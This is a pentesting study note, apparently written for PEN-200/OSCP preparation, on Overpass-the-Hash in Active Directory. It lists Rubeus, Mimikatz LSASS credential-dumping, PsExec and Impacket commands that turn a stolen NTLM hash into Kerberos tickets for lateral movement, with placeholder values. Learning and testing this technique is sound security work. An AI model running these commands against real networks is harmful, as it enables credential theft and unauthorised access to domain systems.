# Overpass-the-Hash

**The bridge between the NTLM and Kerberos login worlds.** If you hold a user's NTLM hash but want to authenticate with **Kerberos**, Overpass-the-Hash uses the hash to obtain a TGT, after which normal Kerberos service tickets can be requested.

```text
NTLM hash
   ↓
create/use Kerberos logon context
   ↓
request TGT
   ↓
request TGS for target service
   ↓
Kerberos-authenticated lateral movement
```

Use this when plain [[Lateral Movement — Pass-the-Hash|Pass-the-Hash]] is blocked or when the target/tool expects Kerberos.

---

## Windows — Rubeus

```powershell
.\Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /ptt
```

Verify:

```powershell
klist
```

---

## Windows — Mimikatz workflow from PEN-200

If you have the user's cached NTLM hash from LSASS:

```text
privilege::debug
sekurlsa::logonpasswords
```

Create a new process with the supplied NTLM material:

```text
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell
```

The new PowerShell process can now request Kerberos tickets without sending a normal NTLM authentication to the target service.

### Important `whoami` caveat

```text
whoami  → may still show the original process-token user
klist   → shows the Kerberos tickets actually available to the logon session
```

Do **not** use `whoami` alone to decide whether the Overpass-the-Hash context worked.

Initially the ticket cache may be empty:

```powershell
klist
```

Trigger domain authentication to force a TGT/TGS request:

```powershell
net use \\<TARGET_HOST>
klist
```

PEN-200 uses `net use` only as a convenient trigger; **any domain operation that requires Kerberos permissions can cause the needed service ticket to be requested.**

Then reuse the Kerberos context with a Kerberos-aware tool, for example:

```powershell
PsExec.exe \\<TARGET_HOSTNAME> cmd
```

> [!tip]
> Prefer the **hostname/FQDN**, not an IP address, when you want Kerberos. Using an IP can cause NTLM to be selected instead.

---

## Linux / Impacket

```bash
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
```

Kerberos is sensitive to **DNS/FQDN resolution and time synchronization**. If `-k -no-pass` fails unexpectedly, check those before abandoning the ticket path.

---

## Mental model

```text
Pass-the-Hash       = NTLM hash → authenticate with NTLM
Overpass-the-Hash   = NTLM hash → obtain/use Kerberos tickets
Pass-the-Ticket     = already have ticket → inject/reuse ticket
```

See [[Active Directory/AD Authentication — NTLM, Kerberos & LSASS|AD Authentication — NTLM, Kerberos & LSASS]] and [[pass-the-ticket]].
